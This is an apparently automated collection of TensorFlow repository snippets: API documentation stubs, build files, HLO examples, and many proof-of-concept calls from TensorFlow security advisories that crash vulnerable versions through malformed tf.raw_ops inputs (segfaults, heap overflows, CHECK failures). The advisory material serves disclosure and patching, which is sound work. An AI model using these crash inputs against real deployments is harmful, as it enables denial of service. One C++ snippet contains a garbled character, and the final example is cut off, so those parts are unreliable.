SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_7

LANGUAGE: python
CODE:
```
DimensionNamesLength()
```

----------------------------------------

TITLE: Performing Static Analysis: Activity Analysis
DESCRIPTION: Demonstrates using the `qual_names.resolve` and `activity.resolve` static analysis passes from `pyct`. It parses a function `f`, resolves qualified names on the AST, and then performs activity analysis to determine which symbols are read or modified within different scopes. It retrieves the function's body scope annotations and prints the sets of read and modified variables.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/pyct_tutorial.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
from tensorflow.python.autograph.pyct import anno
from tensorflow.python.autograph.pyct import parser
from tensorflow.python.autograph.pyct import qual_names
from tensorflow.python.autograph.pyct.static_analysis import annos
from tensorflow.python.autograph.pyct.static_analysis import activity


def f(a):
  b = a + 1
  return b


node, ctx = get_node_and_ctx(f)

node = qual_names.resolve(node)
node = activity.resolve(node, ctx)

fn_scope = anno.getanno(node, annos.NodeAnno.BODY_SCOPE)  # Note: tag will be changed soon.


print('read:', fn_scope.read)
print('modified:', fn_scope.modified)
```

----------------------------------------

TITLE: Triggering QuantizedMatMul Segfault in TensorFlow (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a segfault vulnerability (TFSA-2022-107) in the TensorFlow `tf.raw_ops.QuantizedMatMul` operation. It provides non-scalar input for `min_a` (an empty tensor), which, in vulnerable versions, leads to a crash that can be used for denial of service. The code sets up input tensors `a` and `b` along with quantization parameters `min_a`, `max_a`, `min_b`, and `max_b` before calling the raw operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-107.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

Toutput = tf.qint32
transpose_a = False
transpose_b = False
Tactivation = tf.quint8
a = tf.constant(7, shape=[3,4], dtype=tf.quint8)
b = tf.constant(1, shape=[2,3], dtype=tf.quint8)
min_a = tf.constant([], shape=[0], dtype=tf.float32)
max_a = tf.constant(0, shape=[1], dtype=tf.float32)
min_b = tf.constant(0, shape=[1], dtype=tf.float32)
max_b = tf.constant(0, shape=[1], dtype=tf.float32)
tf.raw_ops.QuantizedMatMul(a=a, b=b, min_a=min_a, max_a=max_a, min_b=min_b, max_b=max_b, Toutput=Toutput, transpose_a=transpose_a, transpose_b=transpose_b, Tactivation=Tactivation)
```

----------------------------------------

TITLE: Triggering SparseCountSparseOutput Heap Overflow Vulnerability - TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger a heap overflow vulnerability in the TensorFlow `SparseCountSparseOutput` operation. The vulnerability is caused by providing negative values for the `minlength` and `maxlength` parameters, leading to incorrect buffer size calculations. It requires the TensorFlow library and is intended to show the problematic call before the vulnerability was patched.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-020.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

tf.raw_ops.SparseCountSparseOutput(
  indices=[[-1,-1]],
  values=[2],
  dense_shape=[1, 1],
  weights=[1],
  binary_output=True,
  minlength=-1,
  maxlength=-1,
  name=None)
```

----------------------------------------

TITLE: Removing Docker Container Bash
DESCRIPTION: Removes the specified Docker container ('tf') from the system. This is typically done after the container has been stopped.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_16

LANGUAGE: Bash
CODE:
```
docker rm tf
```

----------------------------------------

TITLE: Adding FFT4F2D Library Target CMake
DESCRIPTION: Defines the static library target `fft2d_fft4f2d` from its source file. It sets the source directory as a private include path, meaning consumers of this library won't automatically inherit this include directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/fft2d/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
add_library(fft2d_fft4f2d "${FFT2D_SOURCE_DIR}/fft4f2d.c")
target_include_directories(fft2d_fft4f2d PRIVATE "${FFT2D_SOURCE_DIR}")
```

----------------------------------------

TITLE: Demonstrating Conv2DBackpropInput CHECK Failure in TensorFlow Python
DESCRIPTION: This Python code snippet demonstrates the denial of service vulnerability (TFSA-2022-121) in TensorFlow's `Conv2DBackpropInput` operation. It sets up specific input tensors, including an empty `out_backprop` (`[3, 1, 0, 3]`), and calls the operation. When executed with vulnerable versions of TensorFlow, this code is expected to trigger a CHECK failure and crash the process, demonstrating the issue described in the vulnerability report.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-121.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np
input_sizes = [3, 1, 1, 2]
filter = np.ones([1, 3, 2, 3])
out_backprop = np.ones([3, 1, 0, 3])
strides = [1, 1, 2, 1]
padding = 'VALID'

tf.raw_ops.Conv2DBackpropInput(
   input_sizes = input_sizes,
   filter = filter,
   out_backprop = out_backprop,
   strides = strides,
   padding = padding
)
```

----------------------------------------

TITLE: Starting SentencePieceTokenizerOptions FlatBuffers Builder in Python
DESCRIPTION: Initiates the process of building a `SentencePieceTokenizerOptions` object using a FlatBuffers builder. This is a generated function within the TFLite metadata schema Python code, used to prepare the builder for adding fields to the `SentencePieceTokenizerOptions` table. Requires a FlatBuffers `builder` object as input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptionsStart.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SentencePieceTokenizerOptionsStart(
    builder
)
```

----------------------------------------

TITLE: Demonstrating QuantizeAndDequantizeV4 Vulnerability in Python
DESCRIPTION: This Python proof-of-concept snippet demonstrates how a negative `axis` value (-100) can trigger a heap out-of-bounds read vulnerability in the `tf.raw_ops.QuantizeAndDequantizeV4` operation within a TensorFlow function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-185.md#_snippet_1

LANGUAGE: Python
CODE:
```
import tensorflow as tf

@tf.function
def test():
  data=tf.raw_ops.QuantizeAndDequantizeV4(
    input=[1.0,1.0],
    input_min=[1.0,10.0],
    input_max=[1.0,10.0],
    signed_input=False,
    num_bits=10,
    range_given=False,
    round_mode='HALF_TO_EVEN',
    narrow_range=False,
    axis=-100)
  return data

test()
```

----------------------------------------

TITLE: Adding Content to Tensor Metadata Builder (Python)
DESCRIPTION: This Python function signature illustrates how to call `TensorMetadataAddContent`. It is used to add content data, typically represented by an offset or index from the flatbuffer builder, to the tensor metadata being constructed. The function requires a flatbuffer `builder` instance and the `content` data to be added.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataAddContent.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorMetadataAddContent(
    builder, content
)
```

----------------------------------------

TITLE: Demonstrating tf.raw_ops.TensorListConcat Segfault Vulnerability Python
DESCRIPTION: This snippet calls the TensorFlow operation `tf.raw_ops.TensorListConcat` with specific parameters (`element_shape=[]`, `element_dtype=tf.dtypes.float32`) designed to trigger the vulnerability described in TFSA-2022-154. When run on vulnerable versions of TensorFlow, this code is expected to cause a segmentation fault, demonstrating the denial of service impact. Requires TensorFlow library installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-154.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.raw_ops.TensorListConcat(
    input_handle=tf.data.experimental.to_variant(tf.data.Dataset.from_tensor_slices([1, 2, 3])),
    element_dtype=tf.dtypes.float32,
    element_shape=[]
)
```

----------------------------------------

TITLE: Triggering LowerBound Segfault in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger the segfault vulnerability in `tf.raw_ops.LowerBound`. It requires the TensorFlow library. The vulnerability is triggered by providing an empty tensor for the `sorted_inputs` parameter, specifically a tensor with a dimension of size 0. The expected output is a program crash (segfault).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-097.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

out_type = tf.int32
sorted_inputs = tf.constant([], shape=[10,0], dtype=tf.float32)
values = tf.constant([], shape=[10,10,0,10,0], dtype=tf.float32)
tf.raw_ops.LowerBound(sorted_inputs=sorted_inputs, values=values, out_type=out_type)
```

----------------------------------------

TITLE: Check Process Units Null - TensorMetadata (Python)
DESCRIPTION: Determines if the process units list for the tensor metadata is null or empty. Returns True if no process units are specified, False otherwise.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_13

LANGUAGE: python
CODE:
```
ProcessUnitsIsNone()
```

----------------------------------------

TITLE: Defining Chained Reshape Operations in MLIR HLO
DESCRIPTION: Defines a sequence of two XLA Reshape operations where the output of the first reshape is the input to the second. This demonstrates a pattern where the combined effect can be simplified by the indexing map simplifier.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/indexing.md#_snippet_10

LANGUAGE: MLIR HLO
CODE:
```
p0 = f32[10, 10, 10] parameter(0)
reshape1 = f32[50, 20] reshape(p0)
reshape2 = f32[10, 10, 10] reshape(reshape1)
```

----------------------------------------

TITLE: Demonstrating TensorFlow Conv3DBackpropFilterV2 DoS with Invalid Filter Sizes (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a denial of service vulnerability in `tf.raw_ops.Conv3DBackpropFilterV2`. It calls the operation with a scalar `filter_sizes` argument instead of the expected vector, which the kernel fails to validate, resulting in a CHECK failure and crash. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-070.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.Conv3DBackpropFilterV2(
  input=tf.constant(.5053710941, shape=[2,2,2,2,1], dtype=tf.float16),
  filter_sizes=tf.constant(0, shape=[], dtype=tf.int32),
  out_backprop=tf.constant(.5053710941, shape=[2,2,2,2,1], dtype=tf.float16),
  strides=[1, 1, 1, 1, 1],
  padding="VALID",
  data_format="NDHWC",
  dilations=[1, 1, 1, 1, 1])
```

----------------------------------------

TITLE: Triggering CHECK fail in FakeQuantWithMinMaxVarsPerChannelGradient (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the denial of service vulnerability in `tf.quantization.fake_quant_with_min_max_vars_per_channel_gradient`. It provides input tensors for `min` and `max` with a rank of 2 (shape=(1,1)) instead of the expected rank of 1, which causes a `CHECK` failure within the TensorFlow C++ code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-130.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
arg_0=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)
arg_1=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)
arg_2=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)
arg_3=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)
arg_4=8
arg_5=False
arg_6=None
tf.quantization.fake_quant_with_min_max_vars_per_channel_gradient(gradients=arg_0, 
            inputs=arg_1, min=arg_2,  max=arg_3, num_bits=arg_4, 
            narrow_range=arg_5, name=arg_6)
```

----------------------------------------

TITLE: Getting ProcessUnit Options Type Python
DESCRIPTION: Returns the type of the options associated with the `ProcessUnit`. This value can be used to determine how to interpret the object returned by the `Options()` method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnit.md#_snippet_4

LANGUAGE: python
CODE:
```
OptionsType()
```

----------------------------------------

TITLE: Executing TAC Tool with Bazel (Shell)
DESCRIPTION: Provides the command-line instruction to run the Target Aware Conversion (TAC) tool using Bazel. It requires specifying the path to the input TensorFlow Lite model, the desired output path, and a comma-separated list of target hardware backends.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/lite/experimental/tac/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
bazel run -c opt //tensorflow/compiler/mlir/lite/experimental/tac:tac-translate -- <PATH_TO_YOUR_MODEL> -o=<OUTPUT_PATH> -device-specs=<HARDWARE_BACKENDS>
```

----------------------------------------

TITLE: DynamicUpdateSlice 1D Example (Code)
DESCRIPTION: An illustrative example demonstrating the `DynamicUpdateSlice` operation on a 1-dimensional array. It shows the input array (`a`), the update slice (`u`), the start index (`s`), and the resulting array after the update.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_20

LANGUAGE: Code
CODE:
```
let a = {0.0, 1.0, 2.0, 3.0, 4.0}
let u = {5.0, 6.0}
let s = {2}

DynamicUpdateSlice(a, u, s) produces:
{0.0, 1.0, 5.0, 6.0, 4.0}
```

----------------------------------------

TITLE: Declare MLIR HLO Python Sources Group
DESCRIPTION: This command declares a group of sources specifically for MLIR HLO Python components. This group will be populated with sources declared later, like dialect bindings and extensions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/bindings/python/CMakeLists.txt#_snippet_1

LANGUAGE: CMake
CODE:
```
declare_mlir_python_sources(MLIRHLOPythonSources)
```

----------------------------------------

TITLE: GetBuiltinOperatorVersion Logic (DepthwiseConv2D C++)
DESCRIPTION: This C++ snippet shows the logic within the `GetBuiltinOperatorVersion` function for `BuiltinOperator_DEPTHWISE_CONV_2D`. It checks the dilation factors in the operator's built-in data and returns version 2 if either factor is not 1, otherwise returning version 1.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_version.md#_snippet_9

LANGUAGE: C++
CODE:
```
case BuiltinOperator_DEPTHWISE_CONV_2D:
  auto depthwise_conv_params =
      reinterpret_cast<TfLiteDepthwiseConvParams*>(op_sig.builtin_data);
  TFLITE_DCHECK(depthwise_conv_params != nullptr);
  if (depthwise_conv_params->dilation_width_factor != 1 ||
       depthwise_conv_params->dilation_height_factor != 1) {
    return 2;
  } à´return 1;
```

----------------------------------------

TITLE: Conditional Optimization Flags for Windows MSVC 32-bit - CMake
DESCRIPTION: Checks if the system is Windows, the compiler is MSVC, and the architecture is 32-bit. If true, it modifies release build flags to disable specific optimizations (`/Ob.`, `/O2`) and replace `/O2` with `/O1` to potentially resolve build issues on this specific platform configuration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/c/CMakeLists.txt#_snippet_6

LANGUAGE: CMake
CODE:
```
if(CMAKE_SYSTEM_NAME MATCHES "Windows"
    AND (MSVC AND (CMAKE_SIZEOF_VOID_P EQUAL 4)))
  message("Disabling MSVC /O2 optimization for Win32")
  set(CompFlags
    CMAKE_CXX_FLAGS_RELEASE
    CMAKE_CXX_FLAGS_MINSIZEREL
    CMAKE_CXX_FLAGS_RELWITHDEBINFO
    CMAKE_C_FLAGS_RELEASE
    CMAKE_C_FLAGS_MINSIZEREL
    CMAKE_C_FLAGS_RELWITHDEBINFO
  )
  foreach (CompFlag ${CompFlags})
    string(REGEX REPLACE "(\/Ob. )" "" ${CompFlag} "${\${CompFlag}}")
    string(REPLACE "/O2" "/O1" ${CompFlag} "${\${CompFlag}}")
    list(REMOVE_DUPLICATES ${CompFlag})
    set(${\${CompFlag}} "${\${CompFlag}}" CACHE INTERNAL "")
  endforeach()
endif()
```

----------------------------------------

TITLE: Lowering to LLVM IR - LLVM
DESCRIPTION: This snippet shows the final stage of lowering to the LLVM dialect. MLIR operations are converted to their corresponding LLVM instructions. Tensor arguments become pointers, GPU thread/block IDs map to NVVM intrinsics, arithmetic operations become LLVM floating-point/integer operations, and vector manipulations become LLVM vector instructions (extractelement, insertelement, load, store).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/emitters.md#_snippet_6

LANGUAGE: LLVM
CODE:
```
llvm.func @__nv_tanhf(f32) -> f32
llvm.func @main(%arg0: !llvm.ptr, %arg1: !llvm.ptr) {
  %11 = nvvm.read.ptx.sreg.tid.x : i32
  %12 = nvvm.read.ptx.sreg.ctaid.x : i32
  %13 = llvm.mul %11, %1 : i32
  %14 = llvm.mul %12, %0 : i32
  %15 = llvm.add %13, %14 : i32
  %16 = llvm.getelementptr inbounds %arg0[%15] : (!llvm.ptr, i32) -> !llvm.ptr, bf16
  %17 = llvm.load %16 invariant : !llvm.ptr -> vector<4xbf16>
  %18 = llvm.extractelement %17[%2 : i32] : vector<4xbf16>
  %19 = llvm.fmul %18, %18  : bf16
  %20 = llvm.fmul %19, %18  : bf16
  %21 = llvm.fmul %20, %4  : bf16
  %22 = llvm.fadd %18, %21  : bf16
  %23 = llvm.fmul %22, %5  : bf16
  %24 = llvm.fpext %23 : bf16 to f32
  %25 = llvm.call @__nv_tanhf(%24) : (f32) -> f32
  %26 = llvm.fptrunc %25 : f32 to bf16
  %27 = llvm.fadd %26, %6  : bf16
  %28 = llvm.fmul %27, %7  : bf16
  %29 = llvm.fmul %18, %28  : bf16
  %30 = llvm.insertelement %29, %8[%2 : i32] : vector<4xbf16>
  ...
}
```

----------------------------------------

TITLE: Defining RGB ColorSpaceType Constant (Python)
DESCRIPTION: Represents the integer value assigned to the RGB color space type in the TFLite Support metadata schema. This value is used to identify RGB image data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ColorSpaceType.md#_snippet_1

LANGUAGE: Python
CODE:
```
1
```

----------------------------------------

TITLE: Visualizing AutoGraph Module Dependencies (Dot)
DESCRIPTION: This Dot language snippet defines the dependency graph between the primary modules within the TensorFlow AutoGraph library. It illustrates the architectural relationships between modules like `autograph`, `impl`, `converters`, `core`, `lang`, and `operators`. This visualization requires a Dot renderer (e.g., Graphviz) to display the structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/CONTRIBUTING.md#_snippet_1

LANGUAGE: dot
CODE:
```
digraph d_modules {
  autograph [style=filled];
  converters;
  core;
  impl;
  lang;
  operators;

  autograph -> impl;
  autograph -> lang;

  impl -> converters;
  impl -> core;
  impl -> operators;

  lang -> operators;

  converters -> core;
  converters -> lang;
}
```

----------------------------------------

TITLE: Running TensorFlow Libtensorflow Tests with Bazel Bash
DESCRIPTION: Executes the test suite specifically for the libtensorflow package using Bazel inside the Docker container. The --config=libtensorflow_test flag runs the standard nightly tests; different configurations for CPU/GPU and cache are supported via bazelrc and config flags.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_11

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/cpu.bazelrc \
test --config=sigbuild_remote_cache \
--config=libtensorflow_test
```

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/gpu.bazelrc \
test --config=sigbuild_remote_cache \
--config=libtensorflow_test
```

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/cpu.bazelrc \
test --config=sigbuild_local_cache \
--config=libtensorflow_test
```

LANGUAGE: Bash
CODE:
```
docker exec tf \
bazel --bazelrc=/usertools/gpu.bazelrc \
test --config=sigbuild_local_cache \
--config=libtensorflow_test
```

----------------------------------------

TITLE: Demonstrating QuantizeAndDequantizeV4Grad Vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a denial of service vulnerability in `tf.raw_ops.QuantizeAndDequantizeV4Grad` by providing `input_min` and `input_max` tensors with a rank greater than 1. It creates sample input tensors and calls the vulnerable operation, which leads to a `CHECK`-fail internally when `vec<T>()` is called on these tensors, causing the program to crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-031.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

gradient_tensor = tf.constant([0.0], shape=[1])
input_tensor = tf.constant([0.0], shape=[1])
input_min = tf.constant([[0.0]], shape=[1, 1])
input_max = tf.constant([[0.0]], shape=[1, 1])

tf.raw_ops.QuantizeAndDequantizeV4Grad(
  gradients=gradient_tensor, input=input_tensor,
  input_min=input_min, input_max=input_max, axis=0)
```

----------------------------------------

TITLE: Packing BertTokenizerOptionsT Object - Python
DESCRIPTION: This instance method serializes the current `BertTokenizerOptionsT` object's data into a buffer using a provided builder object (likely from a serialization library). It takes the `builder` as a parameter. This method is used to convert the Python object back into a serialized format suitable for saving or transmitting.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptionsT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Reproducing Segfault with Quantized Attributes in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the CVE-2022-41889 vulnerability. It initializes a standard tensor and a quantized tensor (`qint16`) and passes the quantized tensor as the `ksizes` attribute to `tf.compat.v1.extract_volume_patches`. This specific combination triggers the underlying issue in the pywrap code, leading to a segfault.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-152.md#_snippet_0

LANGUAGE: Python
CODE:
```
import numpy as np
import tensorflow as tf

a_input = np.array([1, -1], dtype= np.int32)
a_ksizes =  a_strides = tf.constant(dtype=tf.dtypes.qint16, value=[[1, 4], [5, 2]])


tf.compat.v1.extract_volume_patches(input=a_input,ksizes=a_ksizes,strides=a_strides,padding='VALID')
```

----------------------------------------

TITLE: Packing ValueRangeT into Builder (Python)
DESCRIPTION: Serializes the `ValueRangeT` object's data into a FlatBuffers `builder`. This method prepares the object for writing into a FlatBuffers buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ValueRangeT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Reproducing Null Pointer Exception in TensorFlow DeserializeSparse (Python)
DESCRIPTION: This Python code snippet demonstrates how to trigger the TFSA-2021-181 null pointer vulnerability in TensorFlow's `DeserializeSparse` operation. It provides a scalar input using `tf.data.experimental.to_variant` to the `serialized_sparse` argument, causing the shape inference logic to dereference a null pointer because it expects a tensor with positive rank.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-181.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

dataset = tf.data.Dataset.range(3)

@tf.function
def test():
  y = tf.raw_ops.DeserializeSparse(
    serialized_sparse=tf.data.experimental.to_variant(dataset),
    dtype=tf.int32)

test()
```

----------------------------------------

TITLE: Triggering DeleteSessionTensor Vulnerability in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger the denial of service vulnerability in `tf.raw_ops.DeleteSessionTensor` by providing a non-scalar string tensor as the `handle`. The operation expects a scalar handle but lacks validation, causing a `CHECK`-failure internally.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-063.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

handle = tf.constant("[]", shape=[0], dtype=tf.string)
tf.raw_ops.DeleteSessionTensor(handle=handle)
```

----------------------------------------

TITLE: Configuring TFLite Metal Delegate CMake
DESCRIPTION: This nested block configures the TFLite Metal delegate if `TFLITE_ENABLE_METAL` is true and the target system is Darwin (macOS/iOS). It enables the OBJCXX language, collects Metal source files, defines a static library `metal_delegate`, sets its include directories, adds custom commands to generate a flatbuffer header for `inference_context.fbs`, defines dependencies for the library, and creates separate static libraries for individual Metal CC and MM source files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_29

LANGUAGE: CMake
CODE:
```
if(TFLITE_ENABLE_METAL AND "${CMAKE_SYSTEM_NAME}" STREQUAL "Darwin")
    #
    # libmetal_delegate library
    #
    enable_language(OBJCXX)
    list(APPEND TFLITE_DELEGATES_METAL_SRCS
      ${TFLITE_SOURCE_DIR}/delegates/gpu/metal_delegate.mm
      ${TFLITE_SOURCE_DIR}/delegates/gpu/metal/buffer.cc
      ${TFLITE_SOURCE_DIR}/delegates/gpu/metal/buffer_convert.mm
      ${TFLITE_SOURCE_DIR}/delegates/gpu/metal/common.mm
      ${TFLITE_SOURCE_DIR}/delegates/gpu/metal/compute_task.cc
      ${TFLITE_SOURCE_DIR}/delegates/gpu/metal/inference_context.cc
      ${TFLITE_SOURCE_DIR}/delegates/gpu/metal/metal_arguments.cc
      ${TFLITE_SOURCE_DIR}/delegates/gpu/metal/metal_device.cc
      ${TFLITE_SOURCE_DIR}/delegates/gpu/metal/metal_spatial_tensor.cc
    )
    add_library(metal_delegate STATIC
      ${TFLITE_DELEGATES_METAL_SRCS}
    )
    target_include_directories(metal_delegate PUBLIC
      ${CMAKE_BINARY_DIR}/abseil-cpp
      ${CMAKE_BINARY_DIR}/flatbuffers/include
      PRIVATE ${TENSORFLOW_SOURCE_DIR}
    )
    #
    # generate flatbuffers header for inference_context
    #
    if(FLATBUFFERS_FLATC_EXECUTABLE)
      set(FLATC ${FLATBUFFERS_FLATC_EXECUTABLE})
    else()
      set(FLATC flatc)
    endif()
    add_custom_command(
        OUTPUT ${TFLITE_SOURCE_DIR}/delegates/gpu/metal/inference_context_generated.h
        COMMAND ${FLATC} --scoped-enums
        -I ${TENSORFLOW_SOURCE_DIR}
        -o ${TFLITE_SOURCE_DIR}/delegates/gpu/metal
        -c ${TFLITE_SOURCE_DIR}/delegates/gpu/metal/inference_context.fbs
    )
    add_custom_target(
        inference_context_cc_fbs
        DEPENDS ${TFLITE_SOURCE_DIR}/delegates/gpu/metal/inference_context_generated.h
    )
    add_dependencies(metal_delegate inference_context_cc_fbs)
    #
    # supplementary libraries for libmetal_delegate
    #
    list(APPEND CC_SRCS
        buffer
        compute_task
        inference_context
        metal_arguments
        metal_device
        metal_spatial_tensor
    )
   SET(METAL_DELEGATE_PATH ${TFLITE_SOURCE_DIR}/delegates/gpu/metal/)

   foreach(lib_name ${CC_SRCS})
     set_source_files_properties(${METAL_DELEGATE_PATH}${lib_name}.cc  PROPERTIES LANGUAGE OBJCXX)
     add_library("${lib_name}" STATIC ${METAL_DELEGATE_PATH}${lib_name}.cc)
     target_include_directories("${lib_name}" PUBLIC
       ${CMAKE_BINARY_DIR}/abseil-cpp
       ${CMAKE_BINARY_DIR}/flatbuffers/include
     )
     set_target_properties(${lib_name} PROPERTIES LINKER_LANGUAGE OBJCXX)
     target_link_libraries(${lib_name})
   endforeach()

   list(APPEND MM_SRCS
     buffer_convert
     common
   )
   foreach(lib_name ${MM_SRCS})
     add_library("${lib_name}" STATIC ${METAL_DELEGATE_PATH}${lib_name}.mm)
     target_include_directories("${lib_name}" PUBLIC
       ${CMAKE_BINARY_DIR}/abseil-cpp
       ${CMAKE_BINARY_DIR}/flatbuffers/include
     )
     target_link_libraries(${lib_name})
   endforeach()
endif()
```

----------------------------------------

TITLE: Initializing CustomMetadataT From Object Python
DESCRIPTION: A class method used to initialize a `CustomMetadataT` object from another existing `customMetadata` object. This might be used for copying data or converting representations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadataT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    customMetadata
)
```

----------------------------------------

TITLE: Defining an HLO Elementwise Add Operation (HLO Pseudo-code)
DESCRIPTION: This snippet illustrates an elementwise addition in HLO. It defines two parameter tensors, `p0` and `p1`, both with shape `f32[10, 20]`, and an output tensor `output` of the same shape resulting from their elementwise sum.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/indexing.md#_snippet_2

LANGUAGE: HLO Pseudo-code
CODE:
```
  p0 = f32[10, 20] parameter(0)
  p1 = f32[10, 20] parameter(1)
  output = f32[10, 20] add(p0, p1)
```

----------------------------------------

TITLE: Installing ml_dtypes Target
DESCRIPTION: This command installs the `ml_dtypes` target. It exports the target for use by other projects, specifies installation destinations for library components (though `ml_dtypes` is INTERFACE, this might configure export sets or future components), and explicitly installs the public headers identified earlier to the standard include directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/ml_dtypes/CMakeLists.txt#_snippet_8

LANGUAGE: CMake
CODE:
```
install(
    TARGETS ml_dtypes
    EXPORT tensorflow-liteTargets
    LIBRARY DESTINATION ${CMAKE_INSTALL_LIBDIR}
    ARCHIVE DESTINATION ${CMAKE_INSTALL_LIBDIR}
    PUBLIC_HEADER DESTINATION ${CMAKE_INSTALL_INCLUDEDIR}
  )
```

----------------------------------------

TITLE: Demonstrating as_string Format-string Vulnerability - Python
DESCRIPTION: These Python examples demonstrate the unexpected behavior of `tf.strings.as_string` when different characters are provided for the `fill` argument in vulnerable TensorFlow versions. Various `fill` values cause the internal format string to be interpreted differently by `printf`, leading to garbled or unexpected output, and potentially crashes for certain values like 'n' or 's'.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-013.md#_snippet_1

LANGUAGE: Python
CODE:
```
In [1]: tf.strings.as_string(input=[1234], width=6, fill='-')
Out[1]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['1234  '],
dtype=object)>
In [2]: tf.strings.as_string(input=[1234], width=6, fill='+')
